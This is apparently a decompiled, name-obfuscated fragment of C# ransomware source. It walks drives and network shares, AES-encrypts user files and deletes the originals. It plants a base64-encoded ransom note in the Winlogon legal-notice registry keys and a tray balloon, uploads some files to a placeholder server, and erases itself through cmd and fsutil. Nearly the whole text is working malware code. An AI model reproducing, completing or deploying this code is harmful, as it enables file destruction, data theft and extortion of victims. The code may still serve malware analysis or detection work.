					if (!item.FullName.ToLower().Contains("program files") && !item.FullName.ToLower().Contains("windows") && !item.FullName.ToLower().Contains("perflogs") && !item.FullName.ToLower().Contains("internet explorer") && !item.FullName.ToLower().Contains("programdata") && !item.FullName.ToLower().Contains("appdata") && !item.FullName.ToLower().Contains("autoexec.bat") && !item.FullName.ToLower().Contains("desktop.ini") && !item.FullName.ToLower().Contains("autorun.inf") && !item.FullName.ToLower().Contains("ntuser.dat") && !item.FullName.ToLower().Contains("iconcache.db") && !item.FullName.ToLower().Contains("bootsect.bak") && !item.FullName.ToLower().Contains("boot.ini") && !item.FullName.ToLower().Contains("ntuser.dat.log") && !item.FullName.ToLower().Contains("thumbs.db") && !item.FullName.ToLower().EndsWith(".crypted"))
					{
						if (File.Exists(item.FullName) && (double)item.Length <= double.Parse(rVQUebAfpyi) * 1024.0 * 1024.0 && xGIrNzgCtCuC == "YES")
						{
							list.Add(item.FullName);
						}
						else if (File.Exists(item.FullName) && xGIrNzgCtCuC == "NO")
						{
							list.Add(item.FullName);
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
			foreach (DirectoryInfo item2 in directoryInfo.EnumerateDirectories("*"))
			{
				if (directoryInfo.FullName.ToLower().Contains("program files") || directoryInfo.FullName.ToLower().Contains("windows") || directoryInfo.FullName.ToLower().Contains("perflogs") || directoryInfo.FullName.ToLower().Contains("internet explorer") || directoryInfo.FullName.ToLower().Contains("programdata") || directoryInfo.FullName.ToLower().Contains("appdata"))
				{
					continue;
				}
				try
				{
					foreach (FileInfo item3 in item2.EnumerateFiles("*", SearchOption.AllDirectories))
					{
						try
						{
							if (!item3.FullName.ToLower().Contains("program files") && !item3.FullName.ToLower().Contains("windows") && !item3.FullName.ToLower().Contains("perflogs") && !item3.FullName.ToLower().Contains("internet explorer") && !item3.FullName.ToLower().Contains("programdata") && !item3.FullName.ToLower().Contains("appdata") && !item3.FullName.ToLower().Contains("autoexec.bat") && !item3.FullName.ToLower().Contains("desktop.ini") && !item3.FullName.ToLower().Contains("autorun.inf") && !item3.FullName.ToLower().Contains("ntuser.dat") && !item3.FullName.ToLower().Contains("iconcache.db") && !item3.FullName.ToLower().Contains("bootsect.bak") && !item3.FullName.ToLower().Contains("boot.ini") && !item3.FullName.ToLower().Contains("ntuser.dat.log") && !item3.FullName.ToLower().Contains("thumbs.db") && !item3.FullName.ToLower().EndsWith(".crypted"))
							{
								if (File.Exists(item3.FullName) && (double)item3.Length <= double.Parse(rVQUebAfpyi) * 1024.0 * 1024.0 && xGIrNzgCtCuC == "YES")
								{
									list.Add(item3.FullName);
								}
								else if (File.Exists(item3.FullName) && xGIrNzgCtCuC == "NO")
								{
									list.Add(item3.FullName);
								}
							}
						}
						catch (UnauthorizedAccessException)
						{
						}
						catch
						{
						}
					}
				}
				catch (UnauthorizedAccessException)
				{
				}
				catch
				{
				}
			}
		}
		catch (DirectoryNotFoundException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (PathTooLongException)
		{
		}
		catch
		{
		}
		return list;
	}

	public static string TscPplUQcQPqNrJAe(string JOsfXiHVUGp = "", string GLOmNMxIlYWD = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = JOsfXiHVUGp,
				Arguments = GLOmNMxIlYWD,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
		}
		catch
		{
		}
		return result;
	}

	public static void ZrfhubHEKEzdnBqN(string PjaiqZVJSIb)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = PjaiqZVJSIb,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string ASyAXFKNbugHZ(string gkivlCNtVbHr)
	{
		byte[] bytes = Convert.FromBase64String(gkivlCNtVbHr);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void jrfBoVdWUol(string pLvDpsLffrC = "U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=", string ACpXvIBLLLc = "QXRlbnRpb24uLi4=", string OlCgoNGQvWIQAb = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ASyAXFKNbugHZ(pLvDpsLffrC), writable: true);
		if (registryKey != null)
		{
			registryKey.SetValue(ASyAXFKNbugHZ("TGVnYWxOb3RpY2VDYXB0aW9u"), ASyAXFKNbugHZ(ACpXvIBLLLc));
			registryKey.SetValue(ASyAXFKNbugHZ("TGVnYWxOb3RpY2VUZXh0"), ASyAXFKNbugHZ(OlCgoNGQvWIQAb));
			registryKey.Close();
		}
	}

	public static void eqFYTeLKdqKns()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (VAmLyIWQRHxB == "YES" && !string.IsNullOrEmpty(WHMrqbEzohTr) && !string.IsNullOrEmpty(YUXKrwJUIV))
				{
					jrfBoVdWUol("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cV2lubG9nb24=", ASyAXFKNbugHZ(WHMrqbEzohTr), ASyAXFKNbugHZ(YUXKrwJUIV));
				}
				else
				{
					jrfBoVdWUol();
				}
			}
		}
		catch
		{
		}
	}

	public static void mJiCIbdFhUSkkLUu(string JFmrzMevTxxJz = "QXRlbnRpb24uLi4=", string snLbJrTLnOOm = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(ASyAXFKNbugHZ(JFmrzMevTxxJz));
		val.set_BalloonTipText(ASyAXFKNbugHZ(snLbJrTLnOOm));
		val.ShowBalloonTip(30000);
	}

	private static void SagxpTQHkrlex()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_NetworkConnection");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!VoKqyJGUqLEnsnMI.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
					.Replace("\"", "")
					.Split(new char[1] { '(' })[0].Trim()))
				{
					VoKqyJGUqLEnsnMI.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace("\\\\", "\\").Replace("\\\\\\\\", "\\\\")
						.Replace("\"", "")
						.Split(new char[1] { '(' })[0].Trim());
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void AeLVulBnAvpAKW()
	{
		TscPplUQcQPqNrJAe("cmd.exe", ASyAXFKNbugHZ("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = ASyAXFKNbugHZ("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	private static void JPAnrnwlrKvgz(string[] oBXsTYMfQcpzgE, string[] zEKcjezgZZSMqH, string[] iNKBSAQclT, string cPDDQQClrEz, string osTOaXlbYQN)
	{
		VgnHBSjozGF = Encoding.ASCII.GetBytes(cPDDQQClrEz);
		if (oBXsTYMfQcpzgE[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady && !VoKqyJGUqLEnsnMI.Contains(drives[i].Name))
					{
						VoKqyJGUqLEnsnMI.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < oBXsTYMfQcpzgE.Length; i++)
			{
				if (!VoKqyJGUqLEnsnMI.Contains(oBXsTYMfQcpzgE[i]))
				{
					VoKqyJGUqLEnsnMI.Add(oBXsTYMfQcpzgE[i]);
				}
			}
		}
		foreach (string DtYVFXqVyL in VoKqyJGUqLEnsnMI)
		{
			if (GMtFhBkvDYsInky == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					TegeViBeBkJ(DtYVFXqVyL, zEKcjezgZZSMqH, osTOaXlbYQN, iNKBSAQclT, cPDDQQClrEz);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				TegeViBeBkJ(DtYVFXqVyL, zEKcjezgZZSMqH, osTOaXlbYQN, iNKBSAQclT, cPDDQQClrEz);
			}
		}
	}

	public static void TegeViBeBkJ(string MYVZDTWkTQmHTwlZE, string[] QKYjQXInirGyl, string RyrmAeCKoeVXYO, string[] TDAhPYHNvGPoA, string ardgGxcXZdtO)
	{
		List<string> list = new List<string>();
		list = ((!(MrkHYbDoKLdS == "YES")) ? tJvYWIDhNoZC.SearchFiles(MYVZDTWkTQmHTwlZE) : RyyhPvpcKut(MYVZDTWkTQmHTwlZE));
		foreach (string value in QKYjQXInirGyl)
		{
			foreach (string item in list)
			{
				if (TDAhPYHNvGPoA.Length != 0)
				{
					foreach (string value2 in TDAhPYHNvGPoA)
					{
						if (wvsIiGvGsaXgI == "YES")
						{
							if (!item.ToLower().EndsWith(value2))
							{
								continue;
							}
						}
						else if (!item.EndsWith(value2))
						{
							continue;
						}
						goto IL_02e0;
					}
				}
				if (!item.EndsWith(value) || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer") || item.ToLower().Contains("programdata") || item.ToLower().Contains("appdata") || item.ToLower().Contains("autoexec.bat") || item.ToLower().Contains("desktop.ini") || item.ToLower().Contains("autorun.inf") || item.ToLower().Contains("ntuser.dat") || item.ToLower().Contains("iconcache.db") || item.ToLower().Contains("bootsect.bak") || item.ToLower().Contains("boot.ini") || item.ToLower().Contains("ntuser.dat.log") || item.ToLower().Contains("thumbs.db") || item.ToLower().Contains("HELP_ME_RECOVER_MY_FILES") || item.ToLower().EndsWith(".crypted") || AFuausPFGlCL.Contains(item))
				{
					continue;
				}
				if (lKfjHgiYcaJqT == "YES")
				{
					try
					{
						if (fUntioFZxUccTJ.rLChhkpyhfyR(item))
						{
							fUntioFZxUccTJ.iXWtLKmWQkpHu(item);
						}
					}
					catch
					{
					}
				}
				AFuausPFGlCL.Add(item);
				if (!YSBKaCuBTRXbTz.Contains(Path.GetDirectoryName(item)))
				{
					YSBKaCuBTRXbTz.Add(Path.GetDirectoryName(item));
				}
				try
				{
					if (RyrmAeCKoeVXYO != ".*")
					{
						ZLJHewsVPG(item, item + RyrmAeCKoeVXYO, VgnHBSjozGF);
					}
					else
					{
						ZLJHewsVPG(item, item + ".part", VgnHBSjozGF);
					}
				}
				catch (Exception)
				{
				}
				IL_02e0:;
			}
		}
	}

	private static void ZLJHewsVPG(string lHgbYSgXnZXbKy, string cZzVoTeHDN, byte[] aXeBUDIEFLlc)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(cZzVoTeHDN, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(aXeBUDIEFLlc, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(lHgbYSgXnZXbKy, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			try
			{
				if (cZzVoTeHDN.Length > 0)
				{
					FileStream fileStream3 = new FileStream(lHgbYSgXnZXbKy, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (KnzEUNhFctqwc == "YES")
					{
						foreach (string item in BgcOIRNMjYAp)
						{
							if (lHgbYSgXnZXbKy.ToLower().EndsWith(item) && PvdRPFClLZx == "YES")
							{
								if (Convert.ToInt32(qSJyejaNKxTTs) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										GVXldeVJtPwIJmbQ.rFiqFWzdZrRh("URL", "USERNAME", "ACCESO", lHgbYSgXnZXbKy);
									}
									catch
									{
									}
								}
							}
							else if (lHgbYSgXnZXbKy.ToLower().EndsWith(item) && PvdRPFClLZx == "NO")
							{
								try
								{
									GVXldeVJtPwIJmbQ.rFiqFWzdZrRh("URL", "USERNAME", "ACCESO", lHgbYSgXnZXbKy);
								}
								catch
								{
								}
							}
						}
					}
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(lHgbYSgXnZXbKy) && num2 >= 0)
							{
								File.Delete(lHgbYSgXnZXbKy);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (cZzVoTeHDN.EndsWith(".part"))
					{
						File.Move(cZzVoTeHDN, cZzVoTeHDN.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(cZzVoTeHDN);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}
}
